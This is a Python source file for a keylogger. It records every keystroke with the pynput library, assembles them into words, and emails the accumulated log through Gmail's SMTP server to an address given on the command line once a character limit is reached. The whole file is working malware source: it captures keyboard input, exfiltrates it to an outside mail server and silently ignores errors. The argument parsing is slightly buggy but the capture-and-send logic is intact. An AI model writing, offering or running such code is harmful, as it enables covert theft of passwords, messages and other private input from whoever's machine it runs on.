import smtplib
from getpass import getpass
from pynput.keyboard import Key, Listener
from sys import argv
from commands import *

ARGUMENTS_MIN_SIZE = 3
log, word, char_limit= '', '', 50

def triggerArgumentError() -> None:
    print('Wrong command line arguments.\nCheck help menu.')
    command_help()
    exit(1)

def checkArgumentsSize(argv:list): triggerArgumentError() if len(argv) < ARGUMENTS_MIN_SIZE else None

def getArguments(argv:list) -> list:
    global char_limit
    checkArgumentsSize(argv)
    for argument in argv:
        print(argument)
        if argument == '-h' or argument == '--help':
            command_help()
            exit(0)
        elif argument.startswith('--email='): email = argv[1][8:]
        elif argument.startswith('--char-limit='): char_limit = int(argv[1][13:])
    return [email]


def on_press(key):
    global log, word
    if key == Key.space or key == Key.enter:
        word += ' '
        log += word
        word = ''
        if len(log) >= char_limit: 
            sendLog()
            log = ''
    elif key == Key.backspace: word = word[:-1]
    elif key == Key.shift_l or key == Key.shift_r: return
    elif key==Key.esc: return False
    else: word+= str(key)[1:-1]
        

def sendLog() -> None:
    global log
    try: smtp_server.sendmail(email,email,log)
    except: pass

if __name__ == '__main__':
    [email]= getArguments(argv)
    password = getpass(prompt='password: ', stream=None)

    smtp_server= smtplib.SMTP_SSL('smtp.gmail.com', 465)
    try: smtp_server.login(email,password)
    except: triggerArgumentError()
    
    with Listener(on_press=on_press) as listener: listener.join()